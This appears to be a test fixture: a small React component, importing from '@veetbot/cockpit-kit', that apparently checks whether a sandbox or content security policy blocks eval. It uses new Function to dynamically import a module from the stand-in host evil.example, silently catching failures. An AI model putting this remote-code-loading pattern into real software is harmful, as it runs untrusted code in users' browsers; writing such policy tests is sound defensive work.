import { Tile } from '@veetbot/cockpit-kit';
export default function DynamicImport() {
  const load = new Function('url', 'return import(url)');
  try {
    void (load('https://evil.example/module.js') as Promise<unknown>).catch(() => undefined);
  } catch {
    // Refused without unsafe-eval.
  }
  return <Tile title="dynamic-import" />;
}
